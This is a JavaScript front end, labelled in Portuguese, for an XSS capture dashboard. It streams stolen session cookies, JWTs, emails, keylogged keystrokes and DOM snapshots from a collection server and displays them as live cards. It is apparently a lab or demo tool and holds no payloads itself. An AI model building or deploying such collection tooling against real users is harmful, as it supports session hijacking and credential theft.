'use strict';

// ── Estado ─────────────────────────────────────────────────────────────────
const state = {
  total:   0,
  cookies: 0,
  jwts:    0,
  lastTs:  null,
};

// ── Elementos ──────────────────────────────────────────────────────────────
const elTotal     = document.getElementById('stat-total');
const elCookie    = document.getElementById('stat-cookie');
const elJwt       = document.getElementById('stat-jwt');
const elLast      = document.getElementById('stat-last');
const elCount     = document.getElementById('header-count');
const elTabCount  = document.getElementById('tab-count');
const elList      = document.getElementById('captures-list');
const elEmpty     = document.getElementById('empty-msg');
const elStatus    = document.getElementById('sse-status');
const elPulse     = document.getElementById('sse-pulse');
const elBtnClear  = document.getElementById('btn-clear');

// ── Tabs ───────────────────────────────────────────────────────────────────
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
  });
});

// ── Copy buttons ───────────────────────────────────────────────────────────
document.querySelectorAll('.btn-copy').forEach(btn => {
  btn.addEventListener('click', () => {
    const pre = document.getElementById(btn.dataset.target);
    navigator.clipboard.writeText(pre.textContent.trim()).then(() => {
      btn.textContent = 'Copiado!';
      btn.classList.add('copied');
      setTimeout(() => {
        btn.textContent = 'Copiar';
        btn.classList.remove('copied');
      }, 2000);
    });
  });
});

// ── Clear button ───────────────────────────────────────────────────────────
elBtnClear.addEventListener('click', () => {
  fetch('/api/captures', { method: 'DELETE' });
});

// ── Metadata para cada tipo de captura ────────────────────────────────────
const TYPE_META = {
  cookie:   { icon: '🍪', label: 'Cookie / Sessão',      color: 'var(--orange)', badgeClass: 'badge-reflected' },
  jwt:      { icon: '🔑', label: 'JWT + Credenciais',    color: 'var(--blue)',   badgeClass: 'badge-keylog'   },
  reflected:{ icon: '🔄', label: 'XSS Refletido',        color: 'var(--orange)', badgeClass: 'badge-reflected' },
  stored:   { icon: '💾', label: 'XSS Armazenado',       color: 'var(--red)',    badgeClass: 'badge-stored'   },
  dom:      { icon: '🌐', label: 'Snapshot DOM',          color: 'var(--purple)', badgeClass: 'badge-dom'      },
  keylog:   { icon: '⌨️', label: 'Keylogger',             color: 'var(--red)',    badgeClass: 'badge-stored'   },
  get:      { icon: '📡', label: 'Exfil via Imagem',     color: 'var(--muted)',  badgeClass: 'badge-dom'      },
  post:     { icon: '📤', label: 'Exfil via Fetch',      color: 'var(--muted)',  badgeClass: 'badge-dom'      },
};

function getMeta(type) {
  return TYPE_META[type] || { icon: '📦', label: type, color: 'var(--text)', badgeClass: '' };
}

// ── Formata timestamp ──────────────────────────────────────────────────────
function fmtTime(iso) {
  const d = new Date(iso);
  return d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function fmtRelative(iso) {
  const sec = Math.floor((Date.now() - new Date(iso)) / 1000);
  if (sec < 5)  return 'agora';
  if (sec < 60) return `${sec}s atrás`;
  if (sec < 3600) return `${Math.floor(sec/60)}min atrás`;
  return fmtTime(iso);
}

// ── Constrói card de captura ───────────────────────────────────────────────
function buildCard(capture, isNew = false) {
  const meta = getMeta(capture.type);
  const card = document.createElement('div');
  card.className = 'capture-card' + (isNew ? ' new' : '');
  card.dataset.id = capture.id;

  const rows = [];

  if (capture.data) {
    rows.push(row('cookie', capture.data, 'highlight'));
  }
  if (capture.jwt) {
    rows.push(row('jwt', capture.jwt, 'danger'));
  }
  if (capture.email) {
    rows.push(row('email', capture.email, 'highlight'));
  }
  if (capture.keylog) {
    rows.push(row('teclas', capture.keylog, 'danger'));
  }
  if (capture.domSnap) {
    rows.push(row('dom', capture.domSnap.slice(0, 200), ''));
  }
  if (capture.extra) {
    rows.push(row('extra', capture.extra.slice(0, 200), ''));
  }
  if (capture.url) {
    rows.push(row('url', capture.url, 'url'));
  }
  if (capture.userAgent || capture.ua) {
    rows.push(row('ua', (capture.userAgent || capture.ua).slice(0, 80), ''));
  }

  card.innerHTML = `
    <div class="capture-card-header">
      <span class="capture-icon">${meta.icon}</span>
      <span class="capture-type-text" style="color:${meta.color}">${meta.label}</span>
      <span class="capture-time">${fmtTime(capture.timestamp)}</span>
      &nbsp;
      <span class="capture-ip">${capture.ip || ''}</span>
    </div>
    <div class="capture-body">
      ${rows.join('') || '<span style="color:var(--muted);font-size:0.75rem">Sem dados adicionais</span>'}
    </div>
  `;

  if (isNew) {
    setTimeout(() => card.classList.remove('new'), 3000);
  }
  return card;
}

function row(key, val, cls) {
  return `<div class="capture-row">
    <span class="capture-key">${key}</span>
    <span class="capture-val ${cls}">${escHtml(val)}</span>
  </div>`;
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
}

// ── Atualiza contadores ────────────────────────────────────────────────────
function updateStats() {
  elTotal.textContent    = state.total;
  elCookie.textContent   = state.cookies;
  elJwt.textContent      = state.jwts;
  elCount.textContent    = state.total;
  elTabCount.textContent = `(${state.total})`;
  elLast.textContent     = state.lastTs ? fmtRelative(state.lastTs) : '—';
}

function countCapture(c) {
  state.total++;
  if (c.type === 'cookie' || c.data) state.cookies++;
  if (c.jwt || c.type === 'jwt')      state.jwts++;
  state.lastTs = c.timestamp;
}

// ── Adiciona capture ao feed ───────────────────────────────────────────────
function addCapture(capture, isNew = false) {
  if (elEmpty) elEmpty.style.display = 'none';

  const card = buildCard(capture, isNew);
  if (isNew) {
    elList.prepend(card);
    animateFlow();
  } else {
    elList.appendChild(card);
  }
}

// ── Limpa o feed ──────────────────────────────────────────────────────────
function clearFeed() {
  elList.innerHTML = '';
  elList.appendChild(elEmpty);
  elEmpty.style.display = 'block';
  state.total = state.cookies = state.jwts = 0;
  state.lastTs = null;
  updateStats();
}

// ── Anima fluxo de ataque ──────────────────────────────────────────────────
function animateFlow() {
  ['arrow-1', 'arrow-2', 'arrow-3'].forEach((id, i) => {
    const el = document.getElementById(id);
    if (!el) return;
    setTimeout(() => {
      el.classList.add('active');
      setTimeout(() => el.classList.remove('active'), 1200);
    }, i * 300);
  });
}

// ── SSE ────────────────────────────────────────────────────────────────────
function connectSSE() {
  const es = new EventSource('/events');

  es.addEventListener('init', e => {
    const captures = JSON.parse(e.data);
    captures.forEach(c => {
      countCapture(c);
      addCapture(c, false);
    });
    updateStats();
    elStatus.textContent = 'Conectado';
    elPulse.style.background = 'var(--green)';
  });

  es.addEventListener('capture', e => {
    const c = JSON.parse(e.data);
    countCapture(c);
    addCapture(c, true);
    updateStats();
  });

  es.addEventListener('clear', () => clearFeed());

  es.onerror = () => {
    elStatus.textContent = 'Reconectando...';
    elPulse.style.background = 'var(--red)';
  };

  es.onopen = () => {
    elStatus.textContent = 'Conectado';
    elPulse.style.background = 'var(--green)';
  };
}

// ── Atualiza "última captura" a cada 10s ──────────────────────────────────
setInterval(updateStats, 10000);

// ── Init ───────────────────────────────────────────────────────────────────
connectSSE();
